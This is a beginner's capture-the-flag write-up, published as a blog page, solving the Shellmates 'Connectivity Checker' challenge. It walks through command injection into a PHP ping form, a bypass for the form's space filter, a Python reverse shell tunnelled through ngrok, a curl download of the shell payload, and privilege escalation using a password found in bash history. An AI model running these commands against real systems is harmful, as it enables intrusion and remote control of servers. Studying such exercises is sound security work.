@@ -1,0 +1,454 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+  <meta http-equiv="content-type" content="text/html;charset=utf-8">
+  <meta http-equiv="X-UA-Compatible" content="chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="robots" content="noodp"/>
+  
+  
+  
+  
+  
+  <link rel="prev" href="/2020/cybertalents-algeria-quals-2020-writeup/" />
+  
+  <link rel="canonical" href="/2020/con-checker-shellmates-writeup/" />
+  <link rel='shortcut icon' type='image/x-icon' href='/favicon.ico' />
+  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+  <link rel="manifest" href="/site.webmanifest">
+  <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+  <meta name="msapplication-TileColor" content="#da532c">
+  <meta name="theme-color" content="#ffffff">
+  <title>
+       
+       
+           Connectivity Checker (Shellmates)  —  Write-up. | ouahabs
+       
+  </title>
+  <meta name="title" content="Connectivity Checker (Shellmates)  —  Write-up. | ouahabs">
+    
+  
+  <link rel="stylesheet" href="/font/iconfont.css">
+  <link rel="stylesheet" href="/css/main.min.css">
+
+
+  <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Connectivity Checker (Shellmates)  —  Write-up."/>
+<meta name="twitter:description" content="Introduction (The original article can be found on Medium) I wanted my first write-up to be as beginner friendly as possible, it goes into a lot of details, hope you like it!
+Description So after reading the *instagram post* by *Shellmates* on this challenge, we can get a description that contains some valuable info about this challenge.
+=-=-=-=-=-=-=-= Task =-=-=-=-=-=-=-=
+My friend made a simple web application that pings hosts on the internet to see if they’re up."/>
+
+  <script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Connectivity Checker (Shellmates)  —  Write-up.",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "\/2020\/con-checker-shellmates-writeup\/"
+  },
+  "image": {
+    "@type": "ImageObject",
+    "url": "\/cover.png",
+    "width":  800 ,
+    "height":  600 
+  },
+  "genre": "posts",
+  "keywords": "CTF, Shellmates, Web Security",
+  "wordcount":  1255 ,
+  "url": "\/2020\/con-checker-shellmates-writeup\/",
+  "datePublished": "2020-07-11T00:00:00\u002b00:00",
+  "dateModified": "2020-07-11T00:00:00\u002b00:00",
+  
+  "publisher": {
+    "@type": "Organization",
+    "name": "ouahabs",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "\/logo.png",
+      "width":  127 ,
+      "height":  40 
+    }
+  },
+  "author": {
+    "@type": "Person",
+    "name": "map[name:ouahabs]"
+  },
+  "description": ""
+}
+</script>
+</head>
+
+  
+
+
+
+  <body class="">
+    <div class="wrapper">
+        <nav class="navbar">
+    <div class="container">
+        <div class="navbar-header header-logo">
+        	<a href="/">ouahabs</a>:~# <span class="terminal">_</span>
+        </div>
+        <div class="menu navbar-right">
+                
+                
+                <a class="menu-item" href="/posts/" title="">Posts/</a>
+                
+                <a class="menu-item" href="/categories/" title="">Categories/</a>
+                
+                <a class="menu-item" href="/about" title="">About/</a>
+                
+                <a href="javascript:void(0);" class="theme-switch"><i class="iconfont icon-sun"></i></a>&nbsp;
+        </div>
+    </div>
+</nav>
+<nav class="navbar-mobile" id="nav-mobile" style="display: none">
+     <div class="container">
+        <div class="navbar-header">
+            <div>  <a href="javascript:void(0);" class="theme-switch"><i class="iconfont icon-sun"></i></a>&nbsp;<a href="/">ouahabs</a></div>
+            <div class="menu-toggle">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+     
+          <div class="menu" id="mobile-menu">
+                
+                
+                <a class="menu-item" href="/posts/" title="">Posts/</a>
+                
+                <a class="menu-item" href="/categories/" title="">Categories/</a>
+                
+                <a class="menu-item" href="/about" title="">About/</a>
+                
+        </div>
+    </div>
+</nav>
+
+    	 <main class="main">
+          <div class="container">
+      		
+<article class="post-warp">
+    <header class="post-header">
+        <h1 class="post-title">Connectivity Checker (Shellmates)  —  Write-up.</h1>
+        <div class="post-meta">
+            Written by <a href="/" rel="author">ouahabs</a> 
+                <span class="post-time">
+                    on <time datetime=2020-07-11 >11 July 2020</time>
+                </span>
+                in
+                <i class="iconfont icon-folder"></i>
+                <span class="post-category">
+                        <a href="/categories/writeups/"> WriteUps </a>
+                        
+                </span>
+                <i class="iconfont icon-timer"></i>
+                6 min
+        </div>
+    </header>
+    <div class="post-content">
+        
+
+        
+            
+        
+
+        
+        
+     
+          
+          
+          
+
+          
+          
+          
+
+          <h1 id="introduction">Introduction</h1>
+<p><em>(The original article can be found on <a href="https://medium.com/@ouahabs/connectivity-checker-shellmates-write-up-7ff3b3810757">Medium</a>)</em>
+I wanted my first write-up to be as beginner friendly as possible, it goes into a lot of details, hope you like it!</p>
+<h1 id="description">Description</h1>
+<p>So after reading the <a href="https://www.instagram.com/p/B-2tqp5HsUX/">*instagram post</a>* by <a href="https://shellmates.club/index.html">*Shellmates</a>* on this challenge, we can get a description that contains some valuable info about this challenge.<br>
+=-=-=-=-=-=-=-= Task =-=-=-=-=-=-=-=<br>
+My friend made a simple web application that pings hosts on the internet to see if they’re up. When I asked him if he thought about the security part, he seemed so confident and started talking about his filter.
+Go there and prove him that his web application is not that secure by leaking the content of /home/ctf/flag.txt.
+Note: No scanning, enumeration, brute forcing is required, this challenge is pretty straight forward.<br>
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</p>
+<p>As we can see, we can spot some stuff here and there right away, let’s make list:</p>
+<ul>
+<li>
+<p>There’s probably an input filter of some sort.</p>
+</li>
+<li>
+<p>Flag is located at /home/ctf/flag.txt.</p>
+</li>
+<li>
+<p>We’re not gonna need any enumeration/bruteforcing on this one.</p>
+</li>
+</ul>
+<h1 id="reconnaisance">Reconnaisance</h1>
+<p>Okay so let’s head out to our website and check out what we find, we already know that there’s <em>no scanning or enum</em> required to solve this so this web app is the <em>only</em> thing we’re getting.</p>
+<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="https://cdn-images-1.medium.com/max/2000/1*0RxKklSSzek9NErlK5tcyg.png" alt="Our Web App" class="lazyload"><figcaption class="image-caption">Our Web App</figcaption></figure></p>
+<p>After Checking our web app, and from our description, it looks like our app is a pinging service.</p>
+<p>After some looking around and checking the source code, it looks like there’s nothing too promising there, let’s try playing with our form.</p>
+<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="https://cdn-images-1.medium.com/max/2000/1*TPbaHqzYiQaSs0akIPcDdg.png" alt="Our First Output" class="lazyload"><figcaption class="image-caption">Our First Output</figcaption></figure></p>
+<p>After only inputting an Ip address in, we can notice that what this app does is, it grabs our Ip that we’ve provided and prints the output of the ping command; this is a big indicator here, because now we know that we might use some command injection to maybe exploit this form.</p>
+<h1 id="exploitation">Exploitation</h1>
+<p>First thing that comes to mind here is trying some various methods to inject our own command with the Ip Address.</p>
+<p>After inputting something like 127.0.0.1;ls we get an output that looks like this:</p>
+<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="https://cdn-images-1.medium.com/max/2000/1*v46c26LkEUgcZiGLRhutpw.png" alt="Nice lol" class="lazyload"><figcaption class="image-caption">Nice lol</figcaption></figure></p>
+<p>Let’s try something else, we already know that pinging a valid Ip address is always gonna be successful so let’s try something like 127.0.0.1&amp;&amp;ls</p>
+<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="https://cdn-images-1.medium.com/max/2000/1*8bNgVtZS7IEjOV1uO62ZMw.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure></p>
+<p>We can see that our command works, noice, let’s check out what we have inside that index.php file.</p>
+<p>After trying something like 127.0.0.1&amp;&amp;cat index.php we get an another OKAY BOOMER, looks like the space is filtered as well, after some research we can find that our bash will interpret a command like this {cat,index.php} just like cat index.php , and by trying that, our output will be something like this:</p>
+<pre><code>if (isset($_POST[&quot;ip&quot;])) {
+$ip = $_POST[&quot;ip&quot;];
+if (preg_match('/^(.*)[\s;](.*)$/', &quot;$ip&quot;)) {
+echo '
+
+Okay BOOMER
+
+';
+}
+else {
+$output = shell_exec('(echo &quot;ping -c 1 '.&quot;$ip&quot;.'&quot; | bash) 2&gt; /dev/null');
+echo '
+
+Output:
+
+'.nl2br(&quot;$output&quot;).'
+
+';
+}
+}
+?&gt;
+</code></pre>
+<p>we can notice our filter right here, and it’s only filtering spaces and semicolons.</p>
+<pre><code>if (preg_match('/^(.*)[\s;](.*)$/', &quot;$ip&quot;)) {echo 'Okay BOOMER';}
+</code></pre>
+<p>Something that caught my eye as well was this:</p>
+<pre><code>$output = shell_exec('(echo &quot;ping -c 1 '.&quot;$ip&quot;.'&quot; | bash) 2&gt; /dev/null');
+</code></pre>
+<p>Looks like the app won’t output any error messages as those are being redirected; We should keep this in mind, because if we don’t have any output it might mean that there was an error that’s not being printed to us.</p>
+<p>Anyway we have our flag path so let’s try reading it.</p>
+<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="https://cdn-images-1.medium.com/max/2000/1*xHlxxW6ijvDvgKYCYQttXQ.png" alt="Okay Boomer" class="lazyload"><figcaption class="image-caption">Okay Boomer</figcaption></figure></p>
+<p>Looks like we can’t, let’s check out our permissions.</p>
+<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="https://cdn-images-1.medium.com/max/2000/1*XyhEPefnpdFGC03ozfHSrw.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure></p>
+<p>Looks like we can’t, well then, we’re gonna have to do more work to get the flag, let’s try to privesc *(Privelage Escalate) *to the user ctf to try and read the file.</p>
+<h1 id="getting-a-reverse-shell">Getting A Reverse Shell</h1>
+<p>To privesc we’re gonna need to get an interactive shell, let’s go ahead and do that.</p>
+<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="https://cdn-images-1.medium.com/max/2000/1*OWy8mDe_9TUkhLbtuHf80w.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure></p>
+<p>Looks like we have <em>Python</em>, i’m gonna this shell from <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">*this Cheatsheet</a>*.</p>
+<pre><code>import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;&lt;ip-address&gt;&quot;,&lt;port&gt;));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/bash&quot;)
+</code></pre>
+<p><em>we’ll change those <!-- raw HTML omitted --> later on.</em></p>
+<p>Of course to get a reverse shell we’re gonna have to listen to it on any available unfiltered port, let’s say for example 1234. for that we’re gonna use netcat, but when listening we’re gonna listen on localhost:1234 which is not gonna be accessible from our web app.</p>
+<p>To solve this issue we’re gonna need some sort of middle man that acts as a tunnel to our localhost, which is gonna be <a href="http://www.ngrok.com">Ngrok</a>.</p>
+<p>After getting <em>Ngrok</em> all set up, we’re gonna use it to open a tcp tunnel <em>(http tunnels should work as well).</em></p>
+<pre><code>$ ngrok tcp 1234
+</code></pre>
+<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="https://cdn-images-1.medium.com/max/2000/1*-DMyJaL_am8h52eWua4tdw.png" alt="Our Ngrok Output" class="lazyload"><figcaption class="image-caption">Our Ngrok Output</figcaption></figure></p>
+<p>We have our address and our port that we’re gonna use with our shell and that is:</p>
+<p>0.tcp.ngrok.io : This part is static.</p>
+<p>13193 : This part is gonna change every <em>ngrok</em> session, so we’re gonna have to update our shell if our ngrok shell goes down, or changes.</p>
+<p>Anyway, now that we have what we need our python shell is gonna look like this :</p>
+<pre><code>import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;0.tcp.ngrok.io&quot;,13193));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/bash&quot;)
+</code></pre>
+<p>Now that our shell is ready, let’s host it with :</p>
+<pre><code>$ python -m SimpleHTTPServer 1234
+</code></pre>
+<p>And download it into our machine, however our current working directory is write protected so we’re gonna use /tmp/python-shell.py as our curl output.</p>
+<p>Our original command would be like this:</p>
+<pre><code>$ curl 0.tcp.ngrok.io:13193/python-shell.py --output /tmp/python-shell.py
+</code></pre>
+<p>after using our filter bypass method our command should be something like this :</p>
+<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="https://cdn-images-1.medium.com/max/2388/1*wt0KxBFwFVFoYNJ5Y9_1sw.png" alt="our /tmp folder" class="lazyload"><figcaption class="image-caption">our /tmp folder</figcaption></figure></p>
+<p>*i listed the contents of our */tmp <em>after downloading for the sake of convenience.</em></p>
+<p>Anyhoo, if this was successful you should notice a 200 status code on your terminal. <em>(something like this)</em></p>
+<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="https://cdn-images-1.medium.com/max/2000/1*SRS3kBNrzp18tek1PIJ4IA.png" alt="Excuse my abnormally long prompt lol" class="lazyload"><figcaption class="image-caption">Excuse my abnormally long prompt lol</figcaption></figure><em>Excuse my abnormally long prompt lol</em></p>
+<p>Now that we have our python shell, we’re going to set up a netcat listener but before that we need to close our SimpleHTTPServer because it’s already using our netcat, and we don’t need it anymore.
+Let’s set up our listener like so :</p>
+<pre><code>$ nc -lvnp 1234
+</code></pre>
+<p>Make sure you’re listening on the same port that you used with your *Ngrok *session as it’s the port our shell is gonna get redirected to.</p>
+<p>Let’s head over to our app now and execute our script.</p>
+<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="https://cdn-images-1.medium.com/max/2000/1*apBBaEJLuP8ASUCTyTV66A.png" alt="our python execution" class="lazyload"><figcaption class="image-caption">our python execution</figcaption></figure></p>
+<p><em>this shouldn’t give you any output as it’s gonna hang while we’re listening on our netcat.</em></p>
+<p><em>Voilà</em>! we have our reverse shell.</p>
+<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="https://cdn-images-1.medium.com/max/2000/1*bzawHKK7ER4j9B9HdIK22w.png" alt="psst, hello" class="lazyload"><figcaption class="image-caption">psst, hello</figcaption></figure></p>
+<p>Now that we have our shell, i personally like my shells to be as interactive as can be, so let’s go and upgrade it a little <em>(this step is only for convenience’s sake and can be skipped).</em></p>
+<pre><code>Ctrl+z (backgrounding our shell)
+$ stty raw -echo
+$ fg
+&gt; reset
+&gt; xterm
+$ export TERM=screen (i use  clear a lot lol)
+</code></pre>
+<h1 id="privilege-escalation">Privilege Escalation</h1>
+<p>Now comes my favorite part, and it’s privesc-ing, for this challenge we’re only going vertically because we need more permissions to read our file, we’re gonna need to find a way to escalate, however on this machine there are no visible privesc vectors, and because this article is getting long, i’m gonna skip any unnecessary enumeration.</p>
+<p>If we head to our /home/ctf folder, we can notice that our “.bash_history ” file isn’t empty.</p>
+<p>after reading that we notice this string of text as well as some other commands.</p>
+<pre><code>&lt;..snip..&gt;
+Qu4r4Nt1n3d!@
+&lt;..snip..&gt;
+</code></pre>
+<p>if we try to use this as our password to the user *ctf *we can successfully escalate.</p>
+<pre><code>$ su ctf
+password : Qu4r4Nt1n3d!@
+$ cat /home/ctf/flag.txt
+shellmates{b3_c4r3FuL_w1t|-|_CMD_1nj3ct1i0N!}
+</code></pre>
+<p>And there you go! mission passed! (respect +).</p>
+<h1 id="conclusion">Conclusion</h1>
+<p>This challenge was very fun and is really good for times like this, big thanks to <em><a href="https://shellmates.club/">Shellmates</a></em> for this challenge, <em><a href="https://philomath213.github.io/">Philomoath213</a></em> and <em>Ahmed_2y</em> for everything they’ve provided, check them out!</p>
+<p>Hope you liked my first write-up as a beginner. Thank you!</p>
+
+    </div>
+
+    <div class="post-copyright">
+             
+            <p class="copyright-item">
+                <span>Author:</span>
+                <span>OUAHABS </span>
+                </p>
+            
+           
+            <p class="copyright-item">
+                    <span>Words:</span>
+                   <span>1255</span>
+            </p>
+            
+            <p class="copyright-item">
+                
+                <span>Share:</span>
+                <span>
+
+      
+        <a href="//twitter.com/share?url=%2f2020%2fcon-checker-shellmates-writeup%2f&amp;text=Connectivity%20Checker%20%28Shellmates%29%20%20%e2%80%94%20%20Write-up.&amp;via=" target="_blank" title="Share on Twitter">
+          <i class="iconfont icon-twitter"></i>
+        </a>
+        
+      
+      
+        <a href="//www.facebook.com/sharer/sharer.php?u=%2f2020%2fcon-checker-shellmates-writeup%2f" target="_blank" title="Share on Facebook">
+          <i class="iconfont icon-facebook"></i>
+        </a>
+        
+      
+      
+      
+      
+        <a href="//www.linkedin.com/shareArticle?url=%2f2020%2fcon-checker-shellmates-writeup%2f&amp;title=Connectivity%20Checker%20%28Shellmates%29%20%20%e2%80%94%20%20Write-up." target="_blank" title="Share on LinkedIn">
+          <i class="iconfont icon-linkedin"></i>
+        </a>
+        
+      
+      
+        
+      
+        
+      
+
+          
+
+          
+
+          
+
+          
+</span>
+                
+            </p>
+
+             
+            <p class="copyright-item">
+                Released under <a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a>
+            </p>
+            
+    </div>
+
+  
+    <div class="post-tags">
+        
+            <section>
+            <i class="iconfont icon-icon-tag"></i>Tag: 
+            
+            <span class="tag"><a href="/tags/ctf/">
+                    #CTF</a></span>
+            
+            <span class="tag"><a href="/tags/shellmates/">
+                    #Shellmates</a></span>
+            
+            <span class="tag"><a href="/tags/web-security/">
+                    #Web Security</a></span>
+            
+            </section>
+        
+        <section>
+                <a href="javascript:window.history.back();">Back</a></span> · 
+                <span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav">
+        
+        <a href="/2020/cybertalents-algeria-quals-2020-writeup/" class="prev" rel="prev" title="Quals: Algeria National CTF 2020 (Cyber Talents)  —  Write-up."><i class="iconfont icon-dajiantou"></i>&nbsp;Quals: Algeria National CTF 2020 (Cyber Talents)  —  Write-up.</a>
+         
+        
+    </div>
+
+    <div class="post-comment">
+          
+          
+
+ 
+
+          
+    </div>
+</article>
+          </div>
+		   </main>
+      <footer class="footer">
+    <div class="copyright">
+        &copy;
+        
+        <span itemprop="copyrightYear">2012 - 2020</span>
+        
+         
+            <span class="author" itemprop="copyrightHolder"><a href="/">OUAHABS</a> | </span>
+         
+
+		  <span>Crafted with ❤️ by <a href="https://github.com/Fastbyte01/KeepIt" target="_blank" rel="external nofollow noopener noreffer">KeepIt</a> & <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreffer">Hugo</a></span>
+    </div>
+</footer>
+
+
+
+
+
+
+
+
+
+
+
+
+    
+    <link crossorigin="anonymous" integrity="sha384-yziQACfvCVwLqVFLqkWBYRO3XeA4EqzfXKGwaWnenYn5XzqfJFlFdKEmvutIQdKb" href="https://lib.baomitu.com/lightgallery/1.6.12/css/lightgallery.min.css" rel="stylesheet">
+      
+     <script src="/js/vendor_gallery.min.js" async="" ></script>
+    
+  
+
+
+
+
+
+
+
+     </div>
+  </body>
+</html>
